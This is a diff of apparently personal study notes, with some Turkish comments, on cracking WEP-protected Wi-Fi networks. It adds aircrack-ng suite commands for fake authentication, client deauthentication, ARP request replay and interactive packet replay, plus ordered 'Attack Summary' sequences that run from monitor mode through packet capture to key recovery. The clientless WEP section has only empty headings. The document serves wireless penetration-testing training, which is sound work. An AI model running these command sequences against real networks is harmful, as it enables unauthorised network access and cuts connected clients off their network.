@@ -1,25 +1,81 @@
 
 ### Cracking WEP with Connected Clients ### 
 
+// Fake Authentication Attack
+
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+# aireplay-ng -1 6000 -o 1 -q 10 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface> 
+
+# tcpdump -n -e s0 -vvv -i <interface name>     ## başarısız kimlik doğrulama atağını tespit etme                  
+
+
+// Deauthentication Attack 
+
+# aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface name>  ## PWR değerini kontrol et
 
 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+//ARP Request Replay Attack 
+
+# aireplay-ng -3 -b <AP MAC> -h <Source MAC> <interface name>
+
+
+// Attack Summary
+
+# airmon-ng start <interface> <AP_Channel> 
+# airodump-ng -c <AP_Channel> --bssid <AP_MAC> -w <capture> <interface>
+# aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Your_MAC> <interface>
+# aireplay-ng -3 -b <AP_MAC> -h <Your_MAC> <interface>
+# aireplay-ng -0 1 -a <AP_MAC> -c <Client_MAC> <interface>
+# aircrack-ng <capture>
+
+
+-------------------------------------------------------------------------------------------------------------------------
+
 
 ### Cracking WEP via a Client ### 
 
+// Interactive Packet Replay Attack 
+
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -t 1 <interface>              ## naturel packet replay
+- yes
+
+aireplay-ng -2 -b <AP MAC> -t 1 -c FF:FF:FF:FF:FF:FF -p 0841 <interface>      ## modified packet replay
+-yes
+
+aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
 
 
+// Attack Summary
+
+# airmon-ng start <interface> <AP channel>
+# airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+# aireplay-ng -1 0 -e <ESSID> -a <AP MAC> -h <Your MAC> <interface>
+# aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 <interface>
+# aircrack-ng -z <capture>
 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------
+
 
 ### Cracking Clientless WEP Networks ### 
 
+// Fragmentation Attack 
 
 
+// Packetforge-ng 
 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+// KoreK ChopChop Attack 
+
+
+// Interactive Packet Replay and Aircrack-ng 
+
+
+// Attack Summary
+
+-------------------------------------------------------------------------------------------------------------------------
+
 
 ### Bypassing WEP Shared Key Authentication ### 
 
